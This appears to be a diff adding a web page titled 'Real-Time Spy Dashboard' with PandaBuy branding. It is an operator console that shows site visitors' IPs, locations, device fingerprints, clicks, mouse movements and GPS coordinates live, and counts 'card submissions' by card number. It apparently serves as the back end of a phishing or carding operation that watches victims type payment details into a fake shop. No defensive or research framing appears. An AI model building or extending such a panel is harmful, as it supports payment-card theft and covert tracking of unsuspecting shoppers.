@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🕵️ Real-Time Spy Dashboard - PandaBuy</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+            color: #00ff00;
+            overflow-x: hidden;
+        }
+
+        .header {
+            background: rgba(0, 0, 0, 0.9);
+            padding: 20px;
+            text-align: center;
+            border-bottom: 2px solid #00ff00;
+            box-shadow: 0 4px 20px rgba(0, 255, 0, 0.3);
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            text-shadow: 0 0 20px #00ff00;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from { text-shadow: 0 0 20px #00ff00; }
+            to { text-shadow: 0 0 30px #00ff00, 0 0 40px #00ff00; }
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+
+        .stat-card {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0, 255, 0, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 25px rgba(0, 255, 0, 0.4);
+        }
+
+        .stat-number {
+            font-size: 3rem;
+            font-weight: bold;
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+        }
+
+        .stat-label {
+            font-size: 1rem;
+            color: #888;
+            margin-top: 10px;
+        }
+
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            padding: 20px;
+            height: calc(100vh - 200px);
+        }
+
+        .panel {
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            padding: 20px;
+            overflow-y: auto;
+            box-shadow: 0 4px 15px rgba(0, 255, 0, 0.2);
+        }
+
+        .panel h2 {
+            color: #00ff00;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 1.5rem;
+            text-shadow: 0 0 10px #00ff00;
+        }
+
+        .visitor-item {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+            transition: all 0.3s ease;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .visitor-item:hover {
+            background: rgba(0, 255, 0, 0.2);
+            transform: scale(1.02);
+        }
+
+        .visitor-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .visitor-id {
+            font-weight: bold;
+            color: #00ff00;
+            font-size: 0.9rem;
+        }
+
+        .visitor-time {
+            color: #888;
+            font-size: 0.8rem;
+        }
+
+        .visitor-details {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            font-size: 0.85rem;
+        }
+
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .detail-label {
+            color: #888;
+        }
+
+        .detail-value {
+            color: #00ff00;
+            font-weight: bold;
+        }
+
+        .activity-item {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 4px solid #ff0000;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 4px;
+            animation: pulse 0.5s ease-out;
+        }
+
+        @keyframes pulse {
+            from { background: rgba(255, 0, 0, 0.3); }
+            to { background: rgba(255, 0, 0, 0.1); }
+        }
+
+        .activity-type {
+            font-weight: bold;
+            color: #ff0000;
+            text-transform: uppercase;
+        }
+
+        .activity-details {
+            color: #ccc;
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
+
+        .connection-status {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-weight: bold;
+            z-index: 1000;
+        }
+
+        .connected {
+            background: rgba(0, 255, 0, 0.2);
+            border: 1px solid #00ff00;
+            color: #00ff00;
+        }
+
+        .disconnected {
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid #ff0000;
+            color: #ff0000;
+        }
+
+        .map-container {
+            height: 300px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #888;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="connection-status" id="connectionStatus">
+        🔴 Disconnected
+    </div>
+
+    <div class="header">
+        <h1>🕵️ REAL-TIME SPY DASHBOARD</h1>
+        <p>Live Visitor Monitoring & Fingerprinting System</p>
+    </div>
+
+    <div class="stats-grid">
+        <div class="stat-card">
+            <div class="stat-number" id="totalVisitors">0</div>
+            <div class="stat-label">Total Visitors</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" id="activeVisitors">0</div>
+            <div class="stat-label">Currently Online</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" id="cardSubmissions">0</div>
+            <div class="stat-label">Card Submissions</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" id="uniqueCountries">0</div>
+            <div class="stat-label">Countries</div>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div class="panel">
+            <h2>🌐 Live Visitors</h2>
+            <div id="visitorsContainer">
+                <p style="text-align: center; color: #888;">Waiting for visitors...</p>
+            </div>
+            
+            <div class="map-container">
+                <p>🗺️ Visitor Map (Coming Soon)</p>
+            </div>
+        </div>
+
+        <div class="panel">
+            <h2>⚡ Real-Time Activity</h2>
+            <div id="activityContainer">
+                <p style="text-align: center; color: #888;">No activity yet...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        class SpyDashboard {
+            constructor() {
+                this.socket = null;
+                this.visitors = new Map();
+                this.stats = {
+                    totalVisitors: 0,
+                    activeVisitors: 0,
+                    cardSubmissions: 0,
+                    uniqueCountries: new Set()
+                };
+                this.init();
+            }
+
+            init() {
+                this.connectSocket();
+                this.setupEventListeners();
+                this.startHeartbeat();
+            }
+
+            connectSocket() {
+                // Connect to Socket.IO server
+                this.socket = io();
+                
+                this.socket.on('connect', () => {
+                    console.log('🔗 Connected to spy server');
+                    this.updateConnectionStatus(true);
+                });
+
+                this.socket.on('disconnect', () => {
+                    console.log('❌ Disconnected from spy server');
+                    this.updateConnectionStatus(false);
+                });
+
+                // Listen for visitor events
+                this.socket.on('new_visitor', (data) => {
+                    this.handleNewVisitor(data);
+                });
+
+                this.socket.on('visitor_activity', (data) => {
+                    this.handleVisitorActivity(data);
+                });
+
+                this.socket.on('card_submission', (data) => {
+                    this.handleCardSubmission(data);
+                });
+
+                this.socket.on('visitor_left', (data) => {
+                    this.handleVisitorLeft(data);
+                });
+            }
+
+            updateConnectionStatus(connected) {
+                const status = document.getElementById('connectionStatus');
+                if (connected) {
+                    status.textContent = '🟢 Connected';
+                    status.className = 'connection-status connected';
+                } else {
+                    status.textContent = '🔴 Disconnected';
+                    status.className = 'connection-status disconnected';
+                }
+            }
+
+            handleNewVisitor(data) {
+                console.log('👤 New visitor:', data);
+                
+                this.visitors.set(data.sessionId, {
+                    ...data,
+                    joinTime: Date.now(),
+                    lastActivity: Date.now()
+                });
+
+                this.stats.totalVisitors++;
+                this.stats.activeVisitors++;
+                
+                if (data.fingerprint?.network?.location?.country) {
+                    this.stats.uniqueCountries.add(data.fingerprint.network.location.country);
+                }
+
+                this.updateStats();
+                this.renderVisitors();
+                this.addActivity('NEW_VISITOR', `New visitor from ${data.fingerprint?.network?.location?.country || 'Unknown'}`);
+            }
+
+            handleVisitorActivity(data) {
+                console.log('⚡ Visitor activity:', data);
+                
+                if (this.visitors.has(data.sessionId)) {
+                    const visitor = this.visitors.get(data.sessionId);
+                    visitor.lastActivity = Date.now();
+                    this.visitors.set(data.sessionId, visitor);
+                }
+
+                this.addActivity(data.type.toUpperCase(), this.formatActivityData(data));
+            }
+
+            handleCardSubmission(data) {
+                console.log('💳 Card submission:', data);
+                
+                this.stats.cardSubmissions++;
+                this.updateStats();
+                this.addActivity('CARD_SUBMISSION', `Card ending in ${data.cardNumber?.slice(-4) || '****'} from ${data.country || 'Unknown'}`);
+            }
+
+            handleVisitorLeft(data) {
+                console.log('👋 Visitor left:', data);
+                
+                if (this.visitors.has(data.sessionId)) {
+                    this.visitors.delete(data.sessionId);
+                    this.stats.activeVisitors--;
+                    this.updateStats();
+                    this.renderVisitors();
+                }
+            }
+
+            formatActivityData(data) {
+                switch (data.type) {
+                    case 'click':
+                        return `Clicked ${data.data.target} at (${data.data.x}, ${data.data.y})`;
+                    case 'mouse':
+                        return `Mouse moved to (${data.data.x}, ${data.data.y})`;
+                    case 'visibility':
+                        return `Page ${data.data.state}`;
+                    case 'gps':
+                        return `GPS: ${data.data.latitude?.toFixed(4)}, ${data.data.longitude?.toFixed(4)}`;
+                    default:
+                        return JSON.stringify(data.data);
+                }
+            }
+
+            updateStats() {
+                document.getElementById('totalVisitors').textContent = this.stats.totalVisitors;
+                document.getElementById('activeVisitors').textContent = this.stats.activeVisitors;
+                document.getElementById('cardSubmissions').textContent = this.stats.cardSubmissions;
+                document.getElementById('uniqueCountries').textContent = this.stats.uniqueCountries.size;
+            }
+
+            renderVisitors() {
+                const container = document.getElementById('visitorsContainer');
+                
+                if (this.visitors.size === 0) {
+                    container.innerHTML = '<p style="text-align: center; color: #888;">No active visitors</p>';
+                    return;
+                }
+
+                const visitorsHTML = Array.from(this.visitors.values()).map(visitor => {
+                    const timeOnSite = Math.floor((Date.now() - visitor.joinTime) / 1000);
+                    const fp = visitor.fingerprint || {};
+                    
+                    return `
+                        <div class="visitor-item">
+                            <div class="visitor-header">
+                                <div class="visitor-id">${visitor.sessionId.slice(0, 12)}...</div>
+                                <div class="visitor-time">${timeOnSite}s ago</div>
+                            </div>
+                            <div class="visitor-details">
+                                <div class="detail-item">
+                                    <span class="detail-label">IP:</span>
+                                    <span class="detail-value">${fp.network?.ip || 'Unknown'}</span>
+                                </div>
+                                <div class="detail-item">
+                                    <span class="detail-label">Country:</span>
+                                    <span class="detail-value">${fp.network?.location?.country || 'Unknown'}</span>
+                                </div>
+                                <div class="detail-item">
+                                    <span class="detail-label">Browser:</span>
+                                    <span class="detail-value">${this.getBrowser(fp.basic?.userAgent)}</span>
+                                </div>
+                                <div class="detail-item">
+                                    <span class="detail-label">OS:</span>
+                                    <span class="detail-value">${fp.basic?.platform || 'Unknown'}</span>
+                                </div>
+                                <div class="detail-item">
+                                    <span class="detail-label">Screen:</span>
+                                    <span class="detail-value">${fp.hardware?.screen?.width}x${fp.hardware?.screen?.height}</span>
+                                </div>
+                                <div class="detail-item">
+                                    <span class="detail-label">Device:</span>
+                                    <span class="detail-value">${fp.hardware?.deviceMemory || 'Unknown'}GB RAM</span>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+
+                container.innerHTML = visitorsHTML;
+            }
+
+            addActivity(type, details) {
+                const container = document.getElementById('activityContainer');
+                const time = new Date().toLocaleTimeString();
+                
+                const activityHTML = `
+                    <div class="activity-item">
+                        <div class="activity-type">${type}</div>
+                        <div class="activity-details">${details}</div>
+                        <div style="font-size: 0.8rem; color: #666; margin-top: 5px;">${time}</div>
+                    </div>
+                `;
+
+                container.insertAdjacentHTML('afterbegin', activityHTML);
+
+                // Keep only last 50 activities
+                const activities = container.children;
+                while (activities.length > 50) {
+                    container.removeChild(activities[activities.length - 1]);
+                }
+            }
+
+            getBrowser(userAgent) {
+                if (!userAgent) return 'Unknown';
+                if (userAgent.includes('Chrome')) return 'Chrome';
+                if (userAgent.includes('Firefox')) return 'Firefox';
+                if (userAgent.includes('Safari')) return 'Safari';
+                if (userAgent.includes('Edge')) return 'Edge';
+                return 'Other';
+            }
+
+            setupEventListeners() {
+                // Add any additional event listeners here
+            }
+
+            startHeartbeat() {
+                // Clean up inactive visitors every 30 seconds
+                setInterval(() => {
+                    const now = Date.now();
+                    const timeout = 5 * 60 * 1000; // 5 minutes
+
+                    for (const [sessionId, visitor] of this.visitors) {
+                        if (now - visitor.lastActivity > timeout) {
+                            this.visitors.delete(sessionId);
+                            this.stats.activeVisitors--;
+                        }
+                    }
+
+                    this.updateStats();
+                    this.renderVisitors();
+                }, 30000);
+            }
+        }
+
+        // Initialize the spy dashboard
+        const dashboard = new SpyDashboard();
+    </script>
+</body>
+</html> 
